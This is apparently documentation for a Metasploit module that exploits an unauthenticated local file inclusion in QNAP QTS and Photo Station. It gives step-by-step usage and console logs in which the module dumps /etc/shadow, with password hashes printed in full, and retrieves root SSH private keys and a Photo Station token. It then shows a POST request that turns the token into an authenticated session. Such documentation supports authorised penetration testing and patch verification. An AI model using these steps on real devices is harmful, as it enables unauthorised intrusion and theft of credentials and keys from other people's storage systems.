## Vulnerable Application

### Introduction

This module exploits a local file inclusion in QNAP QTS and Photo
Station that allows an unauthenticated attacker to download files from
the QNAP filesystem.

Because the HTTP server runs as root, it is possible to access
sensitive files, such as SSH private keys and password hashes.

`/etc/shadow` entries can be processed offline, the module saves them in the creds,
and they can be cracked using john the ripper, or hashcat.

There is some confusion in the CVEs assigned to this vulnerability, it corresponds to
one of these : CVE-2019-7192, CVE-2019-7194 or CVE-2019-7195, notice that two of them
have the same description.

## Verification Steps

1. Start `msfconsole`
2. Do: `use auxiliary/gather/qnap_lfi`
3. Do: `set RHOSTS [RHOSTS]`
4. Do: `check`
5. Verify if `check` detects vulnerable hosts as it should
6. Do: `run`
7. Do: `loot`
8. Verify if the run command retrieved the content of /etc/shadow if the host was vulnerable, and saved the file in the loot
9. Do: `creds`
10. Verify if the retrieved hashes were saved in the creds, and their hash type identified correctly.

## Options

### FILEPATH

Set this to the file you want to dump. The default is `/etc/shadow`.

### PRINT

Whether to print file contents to the screen, defaults to true.

## Scenarios

### QNAP QTS 4.3.3

#### Dumping hashes from `/etc/shadow`

```
msf5 auxiliary(gather/qnap_lfi) > run
[*] Running module against [REDACTED]

[*] Getting the Album Id
[+] Got Album Id : cJinsP
[*] Getting the Access Code
[+] Got Access Code : NjU1MzR8MXwxNTkwNjk0MDIy
[*] Attempting Local File Inclusion
[+] File download successful, file saved in /home/redouane/.msf4/loot/20200528212705_default_[REDACTED]_qnap.http_394810.bin
[+] File content:
admin:$1$$0EDxoz0B/Et7aYxLtR/Ik/:14233:0:99999:7:::
guest:$1$$ysap7EeB9ODCrO46Psdbq/:14233:0:99999:7:::
httpdusr:!:16923:0:99999:7:::
Cherle:$1$$Bb3R7AIqzIemj7kGq5k/p1:16923:0:99999:7:::
redouane:$1$$l265pXOEMo0cRDhod/Z3M1:16923:0:99999:7:::
Test:$1$$0EDxoz0B/Et7aYxLtR/Ik/:16928:0:99999:7:::
Merle:$1$JjtNtEJx$PMtCY0tpb2N/rjck2fHVI0:17438:0:99999:7:::
[appuser]:!:17451:0:99999:7:::
[sshd]:!:17637:0:99999:7:::
a9d01ba7:$1$PKQtJPZZ$3RdJRQozKzdx1axJqP9Fe/:18405:0:99999:7:::
[*] adding the /etc/shadow entries to the database
[*] Auxiliary module execution completed
msf5 auxiliary(gather/qnap_lfi) > loot

Loot
====

host           service  type       name    content                   info  path
----           -------  ----       ----    -------                   ----  ----
[REDACTED]              qnap.http  shadow  text/plain                      /home/redouane/.msf4/loot/20200528212705_default_[REDACTED]_qnap.http_394810.bin

msf5 auxiliary(gather/qnap_lfi) > creds
Credentials
===========

host  origin         service  public      private                             realm  private_type        JtR Format
----  ------         -------  ------      -------                             -----  ------------        ----------
      [REDACTED]              admin       $1$$0EDxoz0B/Et7aYxLtR/Ik/                 Nonreplayable hash  md5crypt
      [REDACTED]              guest       $1$$ysap7EeB9ODCrO46Psdbq/                 Nonreplayable hash  md5crypt
      [REDACTED]              Cherle      $1$$Bb3R7AIqzIemj7kGq5k/p1                 Nonreplayable hash  md5crypt
      [REDACTED]              redouane    $1$$l265pXOEMo0cRDhod/Z3M1                 Nonreplayable hash  md5crypt
      [REDACTED]              Test        $1$$0EDxoz0B/Et7aYxLtR/Ik/                 Nonreplayable hash  md5crypt
      [REDACTED]              Merle       $1$JjtNtEJx$PMtCY0tpb2N/rjck2fHVI0         Nonreplayable hash  md5crypt
      [REDACTED]              a9d01ba7    $1$PKQtJPZZ$3RdJRQozKzdx1axJqP9Fe/         Nonreplayable hash  md5crypt

msf5 auxiliary(gather/qnap_lfi) >
```

The hashes can be used to login from the web interface, or through ssh if it's enabled.

#### Dumping ssh private keys

```
msf5 auxiliary(gather/qnap_lfi) > set FILEPATH /root/.ssh/id_rsa
FILEPATH => /root/.ssh/id_rsa
msf5 auxiliary(gather/qnap_lfi) > exploit
[*] Running module against [redacted]

[*] Getting the Album Id
[+] Got Album Id : [redacted]
[*] Getting the Access Code
[+] Got Access Code : [redacted]
[*] Attempting Local File Inclusion
[+] File download successful, file saved in /home/redouane/.msf4/loot/20200528213018_default_[redacted]_qnap.http_983860.bin
[+] File content:
-----BEGIN RSA PRIVATE KEY-----
[redacted]
-----END RSA PRIVATE KEY-----
[*] Auxiliary module execution completed
msf5 auxiliary(gather/qnap_lfi) >
```

#### Retrieving the token, can be used to authenticate

```
msf5 auxiliary(gather/qnap_lfi) > set FILEPATH /share/Multimedia/.@__thumb/ps.app.token
FILEPATH => /share/Multimedia/.@__thumb/ps.app.token
msf5 auxiliary(gather/qnap_lfi) > exploit
[*] Running module against [redacted]

[*] Getting the Album Id
[+] Got Album Id : [redacted]
[*] Getting the Access Code
[+] Got Access Code : [redacted]
[*] Attempting Local File Inclusion
[+] File download successful, file saved in /home/redouane/.msf4/loot/20200528213233_default_[redacted]_qnap.http_815651.bin
[+] File content:
[redacted]
[*] Auxiliary module execution completed
msf5 auxiliary(gather/qnap_lfi) >
```

The token can then be used to authenticate, by sending a POST request to the uri `/cgi-bin/authLogin.cgi`, for the example above:

sending the POST payload: `app_token=[redacted]&app=PHOTO_STATION&auth=1`

This would return an `authSid`, that can be used with most endpoints that require authentication.

### QNAP QTS 4.3.6 with Photo Station 5.7.9

```
```
